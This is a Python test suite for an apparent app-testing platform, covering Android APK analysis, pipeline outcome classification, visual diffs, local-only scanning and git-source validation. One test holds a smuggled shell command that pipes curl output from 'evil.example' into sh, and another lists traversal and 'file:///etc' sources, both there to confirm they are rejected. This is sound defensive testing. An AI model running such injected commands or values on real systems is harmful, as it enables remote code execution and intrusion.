"""Phase 2: adapters, readiness, Android analysis, pipeline classification, visual diff, git/APK ingestion."""

import io
import subprocess
import zipfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from PIL import Image

from app import tooling
from app.adapters.android import AndroidDynamicAdapter, ApkStaticAdapter
from app.adapters.registry import ADAPTERS, adapter_for
from app.domain import Classification, Readiness, ResultStatus
from app.engines import android_static, browser_extra, project_tests, sandbox, web_tools
from app.engines.android_static import ApkInfo, Component
from app.engines.base import CaseOutcome, EngineContext
from app.ingestion import git_source
from app.runs import service as runs
from app.services.settings import ExecutionSettings
from tests.conftest import REPO_ROOT

FIXTURES = REPO_ROOT / "examples"
XMLTREE = """N: android=http://schemas.android.com/apk/res/android (line=2)
  E: manifest (line=2)
    A: http://schemas.android.com/apk/res/android:versionCode(0x0101021b)=7
    A: package="com.example.shop" (Raw: "com.example.shop")
    E: application (line=10)
      A: http://schemas.android.com/apk/res/android:debuggable(0x0101000f)=true
      A: http://schemas.android.com/apk/res/android:usesCleartextTraffic(0x010104ec)=true
      E: activity (line=12)
        A: http://schemas.android.com/apk/res/android:name(0x01010003)="com.example.shop.Main" (Raw: "com.example.shop.Main")
        A: http://schemas.android.com/apk/res/android:exported(0x01010010)=true
        E: intent-filter (line=13)
          E: action (line=14)
            A: http://schemas.android.com/apk/res/android:name(0x01010003)="android.intent.action.MAIN" (Raw: "android.intent.action.MAIN")
          E: category (line=15)
            A: http://schemas.android.com/apk/res/android:name(0x01010003)="android.intent.category.LAUNCHER" (Raw: "android.intent.category.LAUNCHER")
      E: service (line=20)
        A: http://schemas.android.com/apk/res/android:name(0x01010003)="com.example.shop.Sync" (Raw: "com.example.shop.Sync")
        A: http://schemas.android.com/apk/res/android:exported(0x01010010)=true
      E: receiver (line=24)
        A: http://schemas.android.com/apk/res/android:name(0x01010003)="com.example.shop.Boot" (Raw: "com.example.shop.Boot")
        A: http://schemas.android.com/apk/res/android:exported(0x01010010)=false
"""


def _ctx(tmp_path: Path, **settings: object) -> EngineContext:
    return EngineContext(workspace=tmp_path, target_url=None, settings=ExecutionSettings(**settings),
                         evidence_dir=tmp_path / "evidence", inventory={})  # fmt: skip


# ---------------------------------------------------------------- adapters and readiness


def test_every_adapter_has_a_unique_name_and_a_registered_agent() -> None:
    from app.agents.registry import AGENTS

    names = [adapter.name for adapter in ADAPTERS]
    assert len(names) == len(set(names)) == 15
    assert all(adapter.agent in AGENTS and adapter.title for adapter in ADAPTERS)
    assert adapter_for("browser", {}) is not None  # plans created before adapters existed still run
    assert adapter_for("android_dynamic", {"adapter": "does-not-exist"}) is None


def test_android_readiness_names_the_missing_pieces(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("QAI_TOOLS_DIR", str(tmp_path / "no-tools"))
    static = ApkStaticAdapter().environment(ExecutionSettings())
    assert static.status is Readiness.BLOCKED and any("aapt2 is not installed" in r for r in static.reasons)
    dynamic = AndroidDynamicAdapter().readiness(_ctx(tmp_path), {"check": "install_launch"})
    assert not dynamic.runnable and dynamic.reasons
    outcome = runs._execute_case(_ctx(tmp_path), _case("android_dynamic", {"adapter": "android_dynamic"}), dynamic)
    assert outcome.status is ResultStatus.BLOCKED and "is not installed" in outcome.message  # never executed, never passed


def test_emulator_is_not_started_without_enough_free_memory(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from app.engines import android_device

    monkeypatch.setattr(android_device, "connected", lambda: [])
    monkeypatch.setattr(android_device, "environment_problems", lambda: [])
    monkeypatch.setattr(android_device, "free_ram_gb", lambda: 1.2)
    monkeypatch.setattr(tooling.Tool, "available", property(lambda self: True))
    report = AndroidDynamicAdapter().environment(ExecutionSettings())
    assert report.status is Readiness.REQUIRES_DEVICE and "1.2 GB RAM free" in report.reasons[0]


def test_physical_device_is_ignored_unless_the_owner_enabled_it(monkeypatch: pytest.MonkeyPatch) -> None:
    from app.engines import android_device

    monkeypatch.setattr(android_device, "connected", lambda: [("R58M12345", "device")])
    monkeypatch.setattr(android_device, "environment_problems", lambda: ["emulator profile 'qai_api34' does not exist"])
    monkeypatch.setattr(tooling.Tool, "available", property(lambda self: True))
    refused = AndroidDynamicAdapter().environment(ExecutionSettings())
    assert refused.status is Readiness.REQUIRES_DEVICE and "not authorised" in refused.reasons[0]
    assert AndroidDynamicAdapter().environment(ExecutionSettings(android_allow_physical_device=True)).runnable


def _case(engine: str, spec: dict) -> object:
    from app.models import TestCase

    return TestCase(key="X-001", title="t", category="android", engine=engine, spec=spec)


def test_failing_cleanup_is_recorded_and_does_not_stop_other_adapters(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from app.adapters.web import ProjectPipelineAdapter

    def explode(self: object, ctx: EngineContext) -> dict:
        raise OSError("volume is busy")

    monkeypatch.setattr(ProjectPipelineAdapter, "cleanup", explode)
    monkeypatch.setattr(AndroidDynamicAdapter, "cleanup", lambda self, ctx: {"emulator_stopped": True})
    report = runs._cleanup(_ctx(tmp_path))
    assert "volume is busy" in report["project_pipeline"]["error"] and report["android_dynamic"] == {"emulator_stopped": True}


# ---------------------------------------------------------------- Android static analysis


def test_manifest_tree_is_parsed_into_components() -> None:
    info = ApkInfo(package="com.example.shop", target_sdk=34)
    android_static._manifest(info, android_static.parse_xmltree(XMLTREE))
    assert info.application == {"debuggable": "true", "usesCleartextTraffic": "true"}
    kinds = {(c.kind, c.name.rsplit(".", 1)[-1], c.exported) for c in info.components}
    assert kinds == {("activity", "Main", True), ("service", "Sync", True), ("receiver", "Boot", False)}
    assert info.components[0].categories == ["android.intent.category.LAUNCHER"]


def test_manifest_findings_separate_observed_facts_from_things_to_review() -> None:
    info = ApkInfo(package="com.example.shop", version_name="1.0", target_sdk=28, permissions=["android.permission.CAMERA"],
                   signing={"status": "verified", "debug_certificate": True, "schemes": {"v1": True, "v2": False}})  # fmt: skip
    android_static._manifest(info, android_static.parse_xmltree(XMLTREE))
    findings = {f.facts["check"]: f for f in android_static.manifest_findings(info, [])}
    assert {"debuggable", "allow-backup", "cleartext", "target-sdk", "exported-components", "dangerous-permissions",
            "debug-certificate", "v1-only-signature"} == set(findings)  # fmt: skip
    assert findings["debuggable"].classification is Classification.CONFIRMED  # the attribute itself is a fact
    assert findings["exported-components"].classification is Classification.POTENTIAL  # harm depends on the component
    assert findings["exported-components"].facts["components"] == ["com.example.shop.Sync"]  # launcher activity excluded


def test_implicit_export_depends_on_target_sdk() -> None:
    component = Component("receiver", "R", None, "", actions=["x.ACTION"])
    assert android_static.is_exported(component, 30) and not android_static.is_exported(component, 31)


def test_package_content_scan_masks_credentials(tmp_path: Path) -> None:
    key = "AIza" + "B" * 35  # Google API key format, generated here: not a real key
    apk = tmp_path / "app.apk"
    with zipfile.ZipFile(apk, "w") as bundle:
        bundle.writestr("AndroidManifest.xml", b"\x00")
        bundle.writestr(
            "classes.dex", f"http://api.shop-backend.test/v1 {key} http://schemas.android.com/apk/res/android".encode()
        )
    urls, secrets = android_static.scan_contents(apk)
    assert urls == ["http://api.shop-backend.test/v1"]
    assert secrets[0][:2] == ("Google API key", "classes.dex") and key not in secrets[0][2]


def test_apk_upload_is_validated(client: TestClient) -> None:
    def upload(data: bytes) -> object:
        return client.post("/api/projects/import", data={"name": "App", "kind": "apk"},
                           files={"file": ("app.apk", data, "application/vnd.android.package-archive")})  # fmt: skip

    assert upload(b"this is not an apk").json()["detail"] == "The file is not a valid APK (not a ZIP archive)."
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as bundle:
        bundle.writestr("readme.txt", "no manifest here")
    assert "no AndroidManifest.xml" in upload(buffer.getvalue()).json()["detail"]
    assert client.post("/api/projects/import", data={"name": "App", "kind": "apk"}).status_code == 422
    assert client.get("/api/projects").json()["total"] == 0


@pytest.mark.skipif(
    not (tooling.aapt2().available and tooling.sample_apk().available), reason="Android build-tools or sample APK not installed"
)
def test_real_apk_import_plans_android_cases_only(client: TestClient) -> None:
    created = client.post("/api/projects/import", data={"name": "ApiDemos", "kind": "apk"},
                          files={"file": ("ApiDemos-debug.apk", tooling.sample_apk().path.read_bytes(), "application/octet-stream")})  # fmt: skip
    assert created.status_code == 201, created.text
    project = created.json()
    apk = client.get(f"/api/projects/{project['id']}/architecture").json()["inventory"]["android"]["apk"]
    assert apk["package"] == "io.appium.android.apis" and apk["target_sdk"] == 28 and apk["application"]["debuggable"] == "true"
    plan = client.post("/api/plans", json={"project_id": project["id"]}).json()
    engines = {case["engine"] for case in plan["cases"]}
    assert engines == {"android_static", "android_dynamic", "manual"}  # no source scanners, builds or web checks for an APK
    assert [c["key"] for c in plan["cases"] if c["engine"] == "manual"] == ["MAN-AND-001"]
    assert any("not applicable" in note and "Web functional" in note for note in plan["notes"])


# ---------------------------------------------------------------- project pipeline


def test_declared_package_manager_version_is_used_and_validated() -> None:
    install, pm, _ = project_tests._node_install("pnpm@12.4.2+sha512.abc", True)
    assert "pnpm@12.4.2 " in install and "--frozen-lockfile" in install and pm.endswith("/pnpm")
    install, pm, notes = project_tests._node_install("", False)
    assert pm == "npm" and "no lockfile" in notes[0]
    # A hostile manifest cannot inject shell syntax: anything that is not name@x.y.z falls back to npm.
    install, pm, _ = project_tests._node_install("pnpm@1.0.0; curl evil.example | sh", True)
    assert "curl" not in install and "pnpm@1.0.0 " in install
    with pytest.raises(project_tests.WorkbenchUnavailable):
        project_tests._node_install("yarn@4.1.0", True)


@pytest.mark.parametrize(
    ("output", "exit_code", "status", "classification"),
    [
        ("Tests  3 passed (3)", 0, ResultStatus.PASSED, None),
        (
            "src/a.ts(3,7): error TS2322: Type 'string' is not assignable to type 'number'.",
            2,
            ResultStatus.FAILED,
            Classification.CONFIRMED,
        ),
        ("Error: connect ECONNREFUSED 127.0.0.1:5432", 1, ResultStatus.BLOCKED, Classification.ENVIRONMENT),
        ("Invalid environment variables: DATABASE_URL is required", 1, ResultStatus.BLOCKED, Classification.ENVIRONMENT),
        ("x Unable to find package manager binary: cannot find binary path", 1, ResultStatus.BLOCKED, Classification.ENVIRONMENT),
        ("", 137, ResultStatus.BLOCKED, None),
    ],
)
def test_pipeline_step_outcomes_distinguish_defects_from_environment(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, output: str, exit_code: int, status: ResultStatus,
    classification: Classification | None,
) -> None:  # fmt: skip
    bench = project_tests.Workbench(
        "vol", "node:22-slim", "node", "/work", sandbox.Limits(), "/work/.qai-pm/node_modules/.bin/pnpm"
    )
    monkeypatch.setattr(project_tests.Workbench, "run",
                        lambda self, command, timeout_s: sandbox.ContainerResult(exit_code, output, "", False, 10))  # fmt: skip
    outcome = project_tests._node_case(_ctx(tmp_path), bench, "", "test", "test")
    assert outcome.status is status
    assert (outcome.findings[0].classification if outcome.findings else None) is classification
    assert outcome.details["command"] == "pnpm run test"


def test_plan_for_a_next_fixture_comes_from_its_own_scripts_and_routes(client: TestClient) -> None:
    project = client.post("/api/projects/import", data={"name": "Next fixture", "kind": "local_folder",
                                                        "local_path": str(FIXTURES / "fixture-next")}).json()  # fmt: skip
    inventory = client.get(f"/api/projects/{project['id']}/architecture").json()["inventory"]
    assert inventory["framework_evidence"]["Next.js"] == ["dependency in package.json"]
    plan = client.post("/api/plans", json={"project_id": project["id"]}).json()
    steps = {c["spec"].get("step") for c in plan["cases"] if c["engine"] == "project_tests"}
    assert steps == {"typecheck", "test", "build"}  # exactly the scripts this project declares
    assert any("No `lint` script" in note for note in plan["notes"])
    assert not any(c["engine"] == "browser" for c in plan["cases"])  # no target URL: nothing dynamic is planned
    readiness = client.get(f"/api/plans/{plan['id']}/readiness").json()
    assert set(readiness["cases"]) == {c["key"] for c in plan["cases"] if c["engine"] != "manual"} | {
        c["key"] for c in plan["cases"] if c["engine"] == "manual"}  # fmt: skip


# ---------------------------------------------------------------- visual comparison and web tools


def test_visual_diff_ignores_noise_and_reports_real_changes(tmp_path: Path) -> None:
    base = Image.new("RGB", (200, 100), (250, 250, 250))
    base.save(tmp_path / "base.png")
    noisy = Image.new("RGB", (200, 100), (245, 248, 252))  # within the anti-aliasing tolerance
    noisy.save(tmp_path / "noisy.png")
    changed = base.copy()
    changed.paste((200, 30, 30), (0, 0, 100, 50))  # a quarter of the image
    changed.save(tmp_path / "changed.png")
    ratio, _, _ = browser_extra.compare_images(tmp_path / "base.png", tmp_path / "noisy.png", tmp_path / "d1.png")
    assert ratio == 0
    ratio, before, after = browser_extra.compare_images(tmp_path / "base.png", tmp_path / "changed.png", tmp_path / "d2.png")
    assert ratio == pytest.approx(0.25) and before == after == (200, 100) and (tmp_path / "d2.png").is_file()
    taller = Image.new("RGB", (200, 200), (250, 250, 250))
    taller.save(tmp_path / "taller.png")
    assert browser_extra.compare_images(tmp_path / "base.png", tmp_path / "taller.png", tmp_path / "d3.png")[0] == 0


def test_load_and_scan_tools_only_touch_local_targets_by_default(tmp_path: Path) -> None:
    assert web_tools.is_local_target("http://127.0.0.1:3000") and web_tools.is_local_target("http://192.168.1.5/")
    assert not web_tools.is_local_target("https://gramer-bazar-saas.vercel.app")
    assert web_tools.container_url("http://localhost:3000/x?y=1") == "http://host.docker.internal:3000/x?y=1"
    ctx = _ctx(tmp_path, allowed_targets=["93.184.216.34:80"])
    ctx.target_url = "http://93.184.216.34/"
    for tool in (web_tools.load_test, web_tools.zap_baseline):
        outcome: CaseOutcome = tool(ctx, {})
        assert outcome.status is ResultStatus.BLOCKED and "explicit authorisation" in outcome.message


# ---------------------------------------------------------------- git ingestion


def test_git_sources_are_validated() -> None:
    assert git_source.resolve("https://github.com/owner/repo", ["github.com"]) == ("https://github.com/owner/repo.git", True)
    for bad in ("https://evil.example/owner/repo", "git@github.com:owner/repo.git", "http://github.com/owner/repo",
                "https://github.com/owner/repo/../../x", "file:///etc", "relative/path"):  # fmt: skip
        with pytest.raises(git_source.GitSourceError):
            git_source.resolve(bad, ["github.com"])


def test_local_git_repository_import_takes_the_committed_state_only(client: TestClient, tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "requirements.txt").write_text("flask==3.0.0\n")
    (repo / "app.py").write_text("from flask import Flask\n")

    def git(*args: str) -> None:
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args], cwd=repo, check=True, capture_output=True
        )

    git("init", "-q", "-b", "main")
    git("add", "-A")
    git("commit", "-q", "-m", "initial")
    (repo / "uncommitted.py").write_text("x = 1\n")
    created = client.post("/api/projects/import", data={"name": "Repo", "kind": "git", "repository": str(repo)})
    assert created.status_code == 201, created.text
    project = created.json()
    assert project["versions"][0]["file_count"] == 2  # uncommitted.py is not part of HEAD
    config = project["sources"][0]["config"]
    assert config["branch"] == "main" and len(config["commit"]) == 40 and config["remote"] is False
    assert "Flask" in client.get(f"/api/projects/{project['id']}/architecture").json()["inventory"]["frameworks"]
